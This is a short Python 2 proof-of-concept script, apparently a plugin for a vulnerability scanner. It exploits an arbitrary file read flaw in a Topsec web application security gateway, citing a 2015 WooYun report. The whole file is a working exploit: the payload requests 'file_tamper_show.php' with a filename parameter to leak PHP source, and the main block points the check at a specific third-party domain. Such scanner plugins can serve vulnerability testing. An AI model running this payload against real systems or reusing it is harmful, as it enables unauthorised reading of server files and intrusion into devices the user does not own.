#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : 天融信WEB应用安全网关任意文件读取
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0130560
payload   :function/content/tamper/file_tamper_show.php?filename=file_tamper_show.php
"""

import urlparse
def assign(service, arg):
    if service == 'topsec':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = 'function/content/tamper/file_tamper_show.php?filename=file_tamper_show.php'
    target  = arg + payload
    code, head, res, errcode, _ = curl.curl2(target);
    if (code == 200) and ('?php' in res) and ('file_get_contents' in res):
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('topsec', 'https://www.njfyjf.com/')[1])